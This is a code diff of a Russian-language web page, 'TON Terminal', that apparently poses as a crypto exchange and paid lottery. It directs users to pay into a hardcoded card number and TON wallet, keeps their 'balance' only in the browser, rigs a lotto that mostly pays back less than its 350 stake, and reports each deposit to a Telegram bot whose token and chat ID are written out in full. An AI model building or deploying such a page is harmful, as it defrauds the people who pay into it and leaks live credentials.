@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON Terminal — Bugfix Edition 2026</title>
+    <title>TON Terminal — Bugfix Pro 2026</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
@@ -23,8 +23,6 @@
         
         #admin-sidebar { position: fixed; left: -350px; top: 0; width: 320px; height: 100%; z-index: 1000; transition: left 0.4s ease; }
         #admin-sidebar.open { left: 0; }
-        #notify-toast { transform: translateY(-150%); transition: transform 0.5s ease; z-index: 3000; }
-        #notify-toast.show { transform: translateY(20px); }
         .box-shake { animation: shake 0.15s infinite; }
         @keyframes shake { 0%, 100% { transform: translateX(0); } 20% { transform: translateX(-8px); } 40% { transform: translateX(8px); } }
     </style>
@@ -33,21 +31,14 @@
 
     <div id="snow-bg"></div>
 
-    <div id="notify-toast" class="fixed top-0 left-0 right-0 flex justify-center pointer-events-none">
-        <div class="glass border-blue-500/30 px-6 py-4 rounded-2xl shadow-2xl flex items-center gap-3">
-            <div id="notify-icon" class="text-xl">🔔</div>
-            <div id="notify-msg" class="text-xs font-black uppercase">Уведомление</div>
-        </div>
-    </div>
-
     <div id="password-modal" class="fixed inset-0 bg-black/95 z-[2000] hidden items-center justify-center p-4">
         <div class="glass p-10 rounded-[3rem] max-w-sm w-full text-center border-blue-500/20">
             <h3 class="text-xl font-black uppercase mb-2 text-blue-400">Admin Login</h3>
-            <p class="text-[9px] text-slate-500 mb-6 uppercase">Введите актуальный код из бота</p>
+            <p class="text-[9px] text-slate-500 mb-6 uppercase">Введите код из Telegram</p>
             <input type="text" id="admin-pin-input" maxlength="4" class="input-box w-full py-5 rounded-2xl text-4xl font-black text-center outline-none border-blue-500/30 text-white mb-8" placeholder="0000">
             <div class="flex gap-3">
-                <button onclick="checkAdminPassword()" class="flex-1 buy-btn py-4 rounded-xl font-black text-[10px] uppercase">Проверить</button>
-                <button onclick="closeModal('password-modal')" class="px-6 bg-white/5 rounded-xl text-[10px] font-bold uppercase">Назад</button>
+                <button onclick="checkAdminPassword()" class="flex-1 buy-btn py-4 rounded-xl font-black text-[10px] uppercase">Войти</button>
+                <button onclick="closeModal('password-modal')" class="px-6 bg-white/5 rounded-xl text-[10px] font-bold uppercase">Отмена</button>
             </div>
         </div>
     </div>
@@ -121,9 +112,8 @@
                 <button onclick="showDetails('Card')" class="flex-1 bg-white/5 border border-white/5 p-4 rounded-xl text-[10px] font-bold uppercase">Карта</button>
                 <button onclick="showDetails('Crypto')" class="flex-1 bg-white/5 border border-white/5 p-4 rounded-xl text-[10px] font-bold uppercase">Крипта</button>
             </div>
-            <div id="pay-details" class="hidden bg-black/40 p-4 rounded-2xl mb-8 text-[10px] font-mono break-all border border-white/10 text-white"></div>
-            <button onclick="confirmDeposit()" class="w-full buy-btn py-4 rounded-xl font-black text-xs uppercase text-white tracking-widest">Я оплатил</button>
-            <button onclick="closeModal('deposit-modal')" class="w-full mt-4 text-slate-600 text-[10px] font-black uppercase">Отмена</button>
+            <div id="pay-details" class="hidden bg-black/40 p-4 rounded-2xl mb-8 text-[10px] font-mono break-all border border-white/10 text-white select-all"></div>
+            <button onclick="confirmDeposit()" class="w-full buy-btn py-4 rounded-xl font-black text-xs uppercase text-white">Я оплатил</button>
         </div>
     </div>
 
@@ -131,18 +121,18 @@
     <script>
         const TG_TOKEN = "8357376946:AAHbffgk6JY0Ip3yJ3yOGpTaG-_HZ7gjJZw";
         const TG_CHAT_ID = "5252821529";
-        const COINS = ["TON", "BTC", "ETH", "SOL", "TRX", "DOGE", "XRP", "LTC", "ADA", "DOT", "MATIC", "LINK", "SHIB"];
+        const COINS = ["TON", "BTC", "ETH", "SOL", "TRX", "DOGE", "XRP", "LTC", "ADA", "DOT", "MATIC"];
 
-        let balance = parseFloat(localStorage.getItem('user_balance')) || 0.00; // Исправлен начальный баланс на 0
+        // У каждого нового юзера баланс 0.00
+        let balance = parseFloat(localStorage.getItem('user_balance')) || 0.00; 
         let rates = {};
         let depBtnClicks = 0;
         let pendingList = JSON.parse(localStorage.getItem('pending_list')) || [];
         let currentAdminPassword = "";
 
-        // СИНХРОНИЗАЦИЯ ПАРОЛЯ КАЖДЫЕ 70 МИНУТ (У ВСЕХ ОДИНАКОВЫЙ)
+        // СИНХРОНИЗАЦИЯ ПАРОЛЯ ПО ВРЕМЕНИ (70 МИНУТ)
         function getGlobalCode() {
             const timeSlot = Math.floor(Date.now() / (70 * 60 * 1000)); 
-            // Простой алгоритм создания 4-значного числа из временного слота
             return ((timeSlot * 1337) % 9000 + 1000).toString();
         }
 
@@ -150,12 +140,12 @@
             const newCode = getGlobalCode();
             if (newCode !== currentAdminPassword) {
                 currentAdminPassword = newCode;
-                const msg = `🔐 ПАРОЛЬ СИНХРОНИЗИРОВАН: ${currentAdminPassword}\nОн одинаков для всех на 70 минут.`;
+                const msg = `🔐 НОВЫЙ КОД АДМИНА: ${currentAdminPassword}\nОн одинаков для всех на 70 минут.`;
                 try { await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(msg)}`); } catch(e) {}
             }
         }
         updateAdminPassword();
-        setInterval(updateAdminPassword, 60000); // Проверка смены кода каждую минуту
+        setInterval(updateAdminPassword, 30000);
 
         function handleDepositBtnClick() {
             depBtnClicks++;
@@ -167,9 +157,8 @@
 
         function checkAdminPassword() {
             const input = document.getElementById('admin-pin-input');
-            if (input.value === currentAdminPassword) {
-                closeModal('password-modal'); toggleSidebar();
-            } else { alert("Код не совпадает!"); }
+            if (input.value === currentAdminPassword) { closeModal('password-modal'); toggleSidebar(); }
+            else { alert("Неверно!"); }
             input.value = "";
         }
 
@@ -178,8 +167,7 @@
             localStorage.setItem('user_balance', balance);
         }
 
-        function adminAddMoney() { balance += 1000; updateUI(); showNotify("Баланс обновлен!", "💎"); }
-
+        function adminAddMoney() { balance += 1000; updateUI(); }
         function toggleSidebar() { document.getElementById('admin-sidebar').classList.toggle('open'); renderSidebarList(); }
 
         function renderSidebarList() {
@@ -196,7 +184,6 @@
             pendingList.splice(i, 1);
             localStorage.setItem('pending_list', JSON.stringify(pendingList));
             updateUI(); renderSidebarList();
-            showNotify("Оплата подтверждена!", "✅");
         }
 
         async function fetchRates() {
@@ -218,7 +205,7 @@
         function runGlobalConvert() {
             const usd = parseFloat(document.getElementById('conv-usd').value) || 0;
             const container = document.getElementById('conv-results');
-            container.innerHTML = Object.keys(rates).map(c => `<div class="bg-white/5 p-3 rounded-xl border border-white/5 text-center"><p class="text-[7px] text-slate-500 font-bold mb-1">${c}</p><p class="text-[11px] font-black text-blue-400">${(usd/rates[c]).toFixed(rates[c]<1?2:5)}</p></div>`).join('');
+            container.innerHTML = Object.keys(rates).map(c => `<div class="bg-white/5 p-3 rounded-xl border border-white/5 text-center"><p class="text-[7px] text-slate-500 font-bold uppercase mb-1">${c}</p><p class="text-[11px] font-black text-blue-400">${(usd/rates[c]).toFixed(rates[c]<1?2:5)}</p></div>`).join('');
         }
 
         function updateShopRate() {
@@ -231,19 +218,19 @@
             const a = document.getElementById('dep-input').value;
             pendingList.push({ amount: a });
             localStorage.setItem('pending_list', JSON.stringify(pendingList));
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("💰 НОВАЯ ОПЛАТА: "+a+" грн. Проверь и подтверди через админку на сайте!")}`);
-            closeModal('deposit-modal'); showNotify("Запрос отправлен админу!", "⏳");
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("💰 ДЕПОЗИТ: "+a+" грн")}`);
+            closeModal('deposit-modal');
         }
 
         function processFinalPurchase() {
             const p = parseFloat(document.getElementById('shop-total').innerText);
-            if(balance < p) return showNotify("Мало баланса!", "❌");
-            balance -= p; updateUI(); showNotify("Заявка принята!", "🚀");
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("🛒 ПОКУПКА на "+p+" грн")}`);
+            if(balance < p) return alert("Мало грн!");
+            balance -= p; updateUI();
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("🛒 КУПИЛИ на "+p+" грн")}`);
         }
 
         function playLotto() {
-            if (balance < 350) return showNotify("Нужно 350 грн!", "❌");
+            if (balance < 350) return alert("Нужно 350 грн!");
             balance -= 350; updateUI();
             const b = document.getElementById('box-anim');
             b.classList.add('box-shake');
@@ -252,10 +239,10 @@
                 document.getElementById('lotto-stage').classList.add('hidden');
                 document.getElementById('prize-reveal').classList.remove('hidden');
                 const rand = Math.random() * 100;
-                let win = (rand <= 0.0001) ? 2500 : (rand <= 0.05 ? 1000 : (rand <= 5 ? 400 : 275));
+                let win = (rand <= 0.0001) ? 2500 : (rand <= 5 ? 400 : 275);
                 balance += win; updateUI();
                 document.getElementById('prize-value').innerText = win + " грн";
-                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("🎉 ВЫИГРЫШ: "+win+" грн")}`);
+                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("🎉 ЛОТО: "+win+" грн")}`);
             }, 2000);
         }
 
@@ -275,14 +262,6 @@
         function showDetails(m) {
             const d = document.getElementById('pay-details'); d.classList.remove('hidden');
             d.innerText = m === 'Card' ? "444 1144 3897 8734" : "UQC9jGCKJKY5F77vrlWERXBCG38LBIc54y__gZSEprBJ2IGz";
-        }
-
-        function showNotify(text, icon = '🔔') {
-            const toast = document.getElementById('notify-toast');
-            document.getElementById('notify-msg').innerText = text;
-            document.getElementById('notify-icon').innerText = icon;
-            toast.classList.add('show');
-            setTimeout(() => toast.classList.remove('show'), 3000);
         }
 
         setInterval(fetchRates, 30000); fetchRates(); updateUI();
